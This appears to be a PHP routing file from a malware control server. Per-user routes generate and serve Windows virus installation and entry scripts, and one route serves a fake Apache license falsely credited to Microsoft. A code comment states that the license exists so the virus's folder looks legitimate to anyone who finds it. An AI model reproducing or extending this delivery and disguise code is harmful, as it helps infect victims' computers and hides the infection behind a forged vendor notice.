<?php

// routes for installation entry point
use Kelvinho\Virus\Attack\BaseScript\Windows;
use Kelvinho\Virus\Singleton\Header;

global $requestData, $userFactory, $virusFactory, $router;

$router->get("new/*", function () use ($requestData, $userFactory, $virusFactory) {
    if (!$userFactory->exists($user_handle = $requestData->getExplodedPath()[1])) Header::notFound();
    if ($userFactory->get($user_handle)->isHold()) Header::notFound();
    echo Windows::initStandalone(($virus = $virusFactory->new($user_handle))->getVirusId(), $user_handle);
});
$router->get("new/win/*/entry/*", function () use ($requestData, $userFactory) {
    if (!$userFactory->exists($user_handle = $requestData->getExplodedPath()[2])) Header::notFound();
    if ($userFactory->get($user_handle)->isHold()) Header::notFound();
    echo Windows::simpleMain($virus_id = $requestData->getExplodedPath()[4]);
});
//Dummy license text, to make anyone wanders into the virus's folder not suspicious of anything. TL;DR: make it looks legit
$router->get("new/win/*/license", function () use ($requestData, $userFactory) {
    if (!$userFactory->exists($user_handle = $requestData->getExplodedPath()[2])) Header::notFound();
    if ($userFactory->get($user_handle)->isHold()) Header::notFound(); //@formatter:off ?>
Copyright 2019 Microsoft

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
<?php }); //@formatter:on
    